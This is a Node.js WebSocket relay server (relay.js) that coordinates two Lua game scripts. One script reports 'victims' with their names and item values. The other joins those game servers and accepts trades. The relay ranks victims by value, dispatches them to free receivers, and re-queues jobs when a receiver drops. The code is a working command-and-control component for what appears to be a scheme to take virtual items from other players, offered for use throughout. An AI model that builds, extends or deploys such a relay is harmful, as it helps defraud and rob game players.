// ============================================================
// relay.js  —  Cloud WebSocket relay (Railway)
//
// Protocol participants:
//   SENDER   = autotrade.lua  (detects victims, reports status)
//   RECEIVER = autoaccept.lua (joins games, accepts trades)
//
// Message flow:
//
//   autotrade → relay:
//     { type:"register", role:"sender", secret }
//     { type:"hit", jobId, placeId, victimName, totalValue, status:"Waiting" }
//     { type:"status_update", jobId, status, victimName, totalValue }
//
//   relay → autoaccept:
//     { type:"registered", role:"receiver" }
//     { type:"hit", jobId, placeId, victimName, totalValue, status, queuedAt }
//     { type:"status_update", jobId, status, victimName, totalValue }
//
//   autoaccept → relay:
//     { type:"register", role:"receiver", secret }
//     { type:"receiver_ready" }            ← ready for next dispatch (after teleport lands)
//     { type:"claimed", jobId }            ← trade complete
//     { type:"skip", jobId }              ← skip this job, try next
//
//   relay → autotrade:
//     { type:"registered", role:"sender" }
//     { type:"hit_ack", jobId, queuePosition, totalValue }
//     { type:"hit_ack", jobId, rejected:true, reason }
//     { type:"claimed_ack", jobId }
//
// Queue: value-sorted descending. Ties broken by arrival time.
// A receiver is only dispatched to when it is NOT busy.
// Receiver becomes busy the moment a hit is dispatched.
// Receiver becomes ready again via receiver_ready OR claimed OR skip.
// ============================================================

const { WebSocketServer } = require("ws");
const http = require("http");

const SECRET = process.env.RELAY_SECRET || "changeme";
const PORT   = parseInt(process.env.PORT || "8765", 10);

// ── State ────────────────────────────────────────────────────
const senders   = new Set();
const receivers = new Map();   // ws → { busy:bool, activeJobId:string|null }

// Value-sorted queue — highest totalValue first.
// Each entry: { jobId, placeId, victimName, totalValue, status, queuedAt }
const hitQueue  = [];
let   activeJob      = null;    // currently-dispatched job (for status tracking)
let   activeReceiver = null;    // ws of the receiver that got activeJob

// ── HTTP server + health check ────────────────────────────────
const server = http.createServer((req, res) => {
    if (req.method === "GET" && req.url === "/") {
        const receiverList = [];
        for (const [, info] of receivers) {
            receiverList.push({ busy: info.busy, activeJobId: info.activeJobId });
        }
        const status = {
            ok        : true,
            uptime    : Math.floor(process.uptime()),
            queue     : hitQueue.map(h => ({
                jobId      : h.jobId,
                victimName : h.victimName,
                totalValue : h.totalValue,
                status     : h.status,
            })),
            activeJob : activeJob ? {
                jobId      : activeJob.jobId,
                victimName : activeJob.victimName,
                totalValue : activeJob.totalValue,
                status     : activeJob.status,
            } : null,
            senders   : senders.size,
            receivers : receiverList,
        };
        res.writeHead(200, { "Content-Type": "application/json" });
        res.end(JSON.stringify(status));
    } else {
        res.writeHead(404);
        res.end();
    }
});

const wss = new WebSocketServer({ server });

// ── Helpers ──────────────────────────────────────────────────
function send(ws, obj) {
    if (ws && ws.readyState === 1) ws.send(JSON.stringify(obj));
}

function log(tag, msg) {
    const ts = new Date().toISOString().slice(11, 23);
    console.log(`[${ts}] [${tag}] ${msg}`);
}

// Insert hit into queue maintaining descending value order.
// Ties broken by queuedAt ascending (earlier arrival = higher priority).
function enqueue(hit) {
    let i = 0;
    while (i < hitQueue.length) {
        const existing = hitQueue[i];
        if (hit.totalValue > existing.totalValue) break;
        if (hit.totalValue === existing.totalValue && hit.queuedAt < existing.queuedAt) break;
        i++;
    }
    hitQueue.splice(i, 0, hit);
}

// Find a ready (connected + not busy) receiver
function findFreeReceiver() {
    for (const [ws, info] of receivers) {
        if (ws.readyState === 1 && !info.busy) return ws;
    }
    return null;
}

function dispatchNext() {
    if (hitQueue.length === 0) return;

    const target = findFreeReceiver();
    if (!target) {
        const total = receivers.size;
        const busy  = [...receivers.values()].filter(i => i.busy).length;
        log("RELAY", `Queue has ${hitQueue.length} hit(s) — no free receiver (${busy}/${total} busy)`);
        return;
    }

    const hit = hitQueue.shift();
    activeJob      = hit;
    activeReceiver = target;

    const info = receivers.get(target);
    info.busy        = true;
    info.activeJobId = hit.jobId;

    log("DISPATCH", `Job ${hit.jobId} (${hit.victimName} val:${hit.totalValue}) → receiver (${hitQueue.length} remaining)`);
    send(target, { type: "hit", ...hit });
}

// Broadcast a status_update to all receivers
function broadcastStatusUpdate(jobId, status, victimName, totalValue) {
    const payload = { type: "status_update", jobId, status, victimName, totalValue };
    for (const [ws] of receivers) send(ws, payload);
    log("STATUS", `${jobId} → ${status} (${victimName}, val:${totalValue})`);
}

// Mark a receiver as free and optionally clear activeJob
function freeReceiver(ws, jobId) {
    const info = receivers.get(ws);
    if (info) {
        info.busy        = false;
        info.activeJobId = null;
    }
    if (activeJob && activeJob.jobId === jobId) {
        activeJob      = null;
        activeReceiver = null;
    }
}

// ── Heartbeat ─────────────────────────────────────────────────
setInterval(() => {
    const dead = [];
    for (const ws of [...senders, ...receivers.keys()]) {
        if (!ws.isAlive) {
            dead.push(ws);
            ws.terminate();
            continue;
        }
        ws.isAlive = false;
        ws.ping();
    }
    for (const ws of dead) {
        senders.delete(ws);
        receivers.delete(ws);
    }
}, 30_000);

// ── Connection handler ────────────────────────────────────────
wss.on("connection", (ws, req) => {
    const ip = req.socket.remoteAddress;
    ws.isAlive = true;
    ws.on("pong", () => { ws.isAlive = true; });
    log("CONNECT", `New connection from ${ip}`);

    const authTimeout = setTimeout(() => {
        if (!ws.role) {
            log("AUTH", `No registration within 5s from ${ip} — closing`);
            ws.close(4001, "auth timeout");
        }
    }, 5000);

    ws.on("message", (raw) => {
        let msg;
        try { msg = JSON.parse(raw.toString()); }
        catch { return; }

        // ── Registration ──────────────────────────────────────
        if (msg.type === "register") {
            if (msg.secret !== SECRET) {
                log("AUTH", `Wrong secret from ${ip} — closing`);
                ws.close(4003, "invalid secret");
                return;
            }
            clearTimeout(authTimeout);
            ws.role = msg.role;

            if (msg.role === "sender") {
                senders.add(ws);
                log("SENDER", `Registered from ${ip} (${senders.size} total)`);
                send(ws, { type: "registered", role: "sender" });
            }

            if (msg.role === "receiver") {
                receivers.set(ws, { busy: false, activeJobId: null });
                log("RECEIVER", `Registered from ${ip} (${receivers.size} total)`);
                send(ws, { type: "registered", role: "receiver" });
                // Immediately try to dispatch a queued job to this new receiver
                dispatchNext();
            }
            return;
        }

        if (!ws.role) { ws.close(4001, "not registered"); return; }

        // ── Hit (from autotrade.lua) ──────────────────────────
        if (msg.type === "hit" && ws.role === "sender") {
            const status = msg.status || "Waiting";

            if (status === "Claimed" || status === "Missed") {
                log("REJECT", `Hit ${msg.jobId} already ${status} — not queuing`);
                send(ws, { type: "hit_ack", jobId: msg.jobId, rejected: true, reason: status });
                return;
            }

            const val = typeof msg.totalValue === "number" ? msg.totalValue : 0;
            if (val < 1) {
                log("REJECT", `Hit ${msg.jobId} value ${val} < 1 — not queuing`);
                send(ws, { type: "hit_ack", jobId: msg.jobId, rejected: true, reason: "no_value" });
                return;
            }

            const hit = {
                jobId      : msg.jobId,
                placeId    : msg.placeId,
                victimName : msg.victimName,
                totalValue : val,
                status     : status,
                queuedAt   : Date.now(),
            };
            enqueue(hit);
            const pos = hitQueue.indexOf(hit) + 1;
            log("HIT", `Queued ${hit.jobId} (${hit.victimName} val:${val}) — pos ${pos} of ${hitQueue.length}`);
            send(ws, { type: "hit_ack", jobId: hit.jobId, queuePosition: pos, totalValue: val });
            dispatchNext();
            return;
        }

        // ── Status update (from autotrade.lua) ───────────────
        if (msg.type === "status_update" && ws.role === "sender") {
            const { jobId, status, victimName, totalValue } = msg;
            log("STATUS_IN", `${jobId} → ${status}`);

            broadcastStatusUpdate(jobId, status, victimName, totalValue);

            const isTerminal = (status === "Claimed" || status === "Missed" || status === "Partial");

            // Active job went terminal — clear it
            if (activeJob && activeJob.jobId === jobId && isTerminal) {
                log("TERMINAL", `Active job ${jobId} → ${status} — clearing`);
                const recv = activeReceiver;
                activeJob.status = status;
                freeReceiver(recv, jobId);
                dispatchNext();
            }

            // Queued job went terminal — remove it
            const qi = hitQueue.findIndex(h => h.jobId === jobId);
            if (qi !== -1 && isTerminal) {
                log("DEQUEUE", `Removing terminal job ${jobId} (${status}) from queue`);
                hitQueue.splice(qi, 1);
            }

            // Update status on queued job if still alive
            if (qi !== -1 && !isTerminal) {
                hitQueue[qi].status = status;
            }

            return;
        }

        // ── Receiver ready (from autoaccept.lua) ─────────────
        // Sent when the receiver has finished teleporting into the game
        // and is ready for the relay to dispatch the NEXT job once it
        // finishes handling the current one.  (Current job stays "active"
        // until claimed/skip — this just marks it as the receiver being
        // alive and operational, not blocked by teleport delay.)
        // 
        // Actually used to signal:  "I'm in-game now, keep me dispatched
        // to this job — don't re-dispatch to me for another."
        // In practice no action is needed because the receiver stays
        // busy until claimed/skip arrives.  But we log it.
        if (msg.type === "receiver_ready" && ws.role === "receiver") {
            const info = receivers.get(ws);
            log("RECV_READY", `Receiver in-game${info && info.activeJobId ? " for " + info.activeJobId : ""}`);
            return;
        }

        // ── Claimed (from autoaccept.lua) ─────────────────────
        if (msg.type === "claimed" && ws.role === "receiver") {
            const jobId = msg.jobId;
            log("CLAIMED", `Job ${jobId} complete`);

            if (activeJob && activeJob.jobId === jobId) {
                freeReceiver(ws, jobId);
            } else {
                // Still free the receiver even if jobId mismatch
                const info = receivers.get(ws);
                if (info) { info.busy = false; info.activeJobId = null; }
                log("WARN", `claimed ${jobId} != active ${activeJob?.jobId} — freed receiver anyway`);
            }

            for (const s of senders) send(s, { type: "claimed_ack", jobId });
            dispatchNext();
            return;
        }

        // ── Skip (from autoaccept.lua) ────────────────────────
        if (msg.type === "skip" && ws.role === "receiver") {
            const jobId = msg.jobId;
            log("SKIP", `Job ${jobId} skipped`);

            if (activeJob && activeJob.jobId === jobId) {
                freeReceiver(ws, jobId);
            } else {
                const info = receivers.get(ws);
                if (info) { info.busy = false; info.activeJobId = null; }
            }

            dispatchNext();
            return;
        }
    });

    ws.on("close", () => {
        const wasActive = (ws === activeReceiver && activeJob);
        const info      = receivers.get(ws);

        senders.delete(ws);
        receivers.delete(ws);
        log("DISCONNECT", `${ws.role || "unregistered"} from ${ip}`);

        // If the active receiver dropped mid-job, recover the job
        if (wasActive) {
            log("RECOVERY", `Receiver dropped — re-queueing ${activeJob.jobId}`);
            const recovered = { ...activeJob, queuedAt: Date.now() - 1_000_000 };
            activeJob      = null;
            activeReceiver = null;
            enqueue(recovered);
            dispatchNext();
        }
    });

    ws.on("error", (err) => log("ERROR", `${ws.role || "?"}: ${err.message}`));
});

server.listen(PORT, () => {
    log("RELAY", `Running on port ${PORT}`);
    log("RELAY", `Secret: ${SECRET === "changeme" ? "⚠️  DEFAULT — set RELAY_SECRET in env!" : "✅ set"}`);
});
